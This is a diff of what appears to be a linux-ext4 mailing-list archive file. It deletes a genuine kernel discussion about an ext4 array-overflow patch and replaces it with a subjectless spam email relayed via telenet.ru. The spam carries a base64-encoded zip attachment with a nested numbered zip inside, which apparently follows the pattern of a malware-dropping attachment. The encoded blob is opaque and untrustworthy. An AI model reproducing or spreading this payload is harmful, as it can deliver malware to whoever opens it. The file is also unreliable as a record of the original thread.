@@ -1,82 +1,76 @@
-From: Amir Goldstein <amir73il@gmail.com>
-Subject: Re: [PATCH] ext4: silence array overflow warning
-Date: Tue, 18 Jul 2017 14:00:21 +0300
-Message-ID: <CAOQ4uxi+H4AQW=twF8pL1G-rOYcpFLw5T+nktZG9jQkjimkiZA@mail.gmail.com>
-References: <20170718092702.bpk2k5qjg4cz2mqk@mwanda>
+From: <bfoster@uca.edu>
+Subject: (unknown)
+Date: Tue, 18 Jul 2017 15:56:55 -0000
+Message-ID: <150039341544.17375.5077367063359996878@telenet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Cc: "Theodore Ts'o" <tytso@mit.edu>,
-        Andreas Dilger <adilger.kernel@dilger.ca>,
-        Ext4 <linux-ext4@vger.kernel.org>,
-        kernel-janitors@vger.kernel.org,
-        linux-fsdevel <linux-fsdevel@vger.kernel.org>,
-        "Darrick J. Wong" <darrick.wong@oracle.com>
-To: Dan Carpenter <dan.carpenter@oracle.com>
-Return-path: <linux-fsdevel-owner@vger.kernel.org>
-In-Reply-To: <20170718092702.bpk2k5qjg4cz2mqk@mwanda>
-Sender: linux-fsdevel-owner@vger.kernel.org
-List-Id: linux-ext4.vger.kernel.org
+Content-Type: application/zip; name="EMAIL_08011542258_linux-ext4.zip
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
+Return-path: <linux-ext4-owner@vger.kernel.org>
+Received: from 3.170-192-31.telenet.ru ([31.192.170.3]:38151 "HELO telenet.ru"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751412AbdGRP46 (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
+        Tue, 18 Jul 2017 11:56:58 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-ext4-owner@vger.kernel.org
+List-ID: <linux-ext4.vger.kernel.org>
 
-CC fsdevel, because this bug is duplicated at least in 6 other filesystems:
-ext2, exofs, ocfs2, f2fs, nilfs2, btrfs
-
-On Tue, Jul 18, 2017 at 12:27 PM, Dan Carpenter
-<dan.carpenter@oracle.com> wrote:
-> I get a static checker warning:
->
->     fs/ext4/ext4.h:3091 ext4_set_de_type()
->     error: buffer overflow 'ext4_type_by_mode' 15 <= 15
->
-> It seems unlikely that we would hit this read overflow in real life, but
-> it's also simple enough to make the array 16 bytes instead of 15.
-
-FYI, I posted a series to fix this in 10 different filesystems, all have
-the same hypothetical bug:
-https://marc.info/?l=linux-fsdevel&m=148217829301701&w=2
-There were objections about using common code for filesystem
-specific on-disk format, so my initial approach was dropped.
-
-My manual code audit of ext4 concluded that this specific bug cannot
-hit current ext4 code, which sanitizes the value of i_mode when reading
-it from disk:
-https://marc.info/?l=linux-fsdevel&m=148243866204444&w=2
-
-The only maintainer that followed up on fixing the array overflow was
-Darrick and a fix was merged to xfs:
-1fc4d33fed12 xfs: replace xfs_mode_to_ftype table with switch statement
-
-So there are 6 more fix patches you can send.
-
-Cheers,
-Amir.
-
->
-> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
->
-> diff --git a/fs/ext4/ext4.h b/fs/ext4/ext4.h
-> index 9ebde0cd632e..fbaeb441bed3 100644
-> --- a/fs/ext4/ext4.h
-> +++ b/fs/ext4/ext4.h
-> @@ -3074,7 +3074,7 @@ extern int ext4_handle_dirty_dirent_node(handle_t *handle,
->                                          struct inode *inode,
->                                          struct buffer_head *bh);
->  #define S_SHIFT 12
-> -static const unsigned char ext4_type_by_mode[S_IFMT >> S_SHIFT] = {
-> +static const unsigned char ext4_type_by_mode[(S_IFMT >> S_SHIFT) + 1] = {
->         [S_IFREG >> S_SHIFT]    = EXT4_FT_REG_FILE,
->         [S_IFDIR >> S_SHIFT]    = EXT4_FT_DIR,
->         [S_IFCHR >> S_SHIFT]    = EXT4_FT_CHRDEV,
-
-I still think it makes more sense to use common DT_* macros here,
-even if not using common conversion helpers, i.e.:
-https://marc.info/?l=linux-fsdevel&m=148221950110233&w=2
-
-If for nothing else, then for not redefining S_SHIFT 7 times
-in the code:
-fs/btrfs/inode.c:#define S_SHIFT 12
-fs/exofs/dir.c:#define S_SHIFT 12
-fs/ext2/dir.c:#define S_SHIFT 12
-fs/ext4/ext4.h:#define S_SHIFT 12
-fs/nilfs2/dir.c:#define S_SHIFT 12
-fs/ocfs2/ocfs2_fs.h:#define S_SHIFT 12
-include/linux/f2fs_fs.h:#define S_SHIFT 12
+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
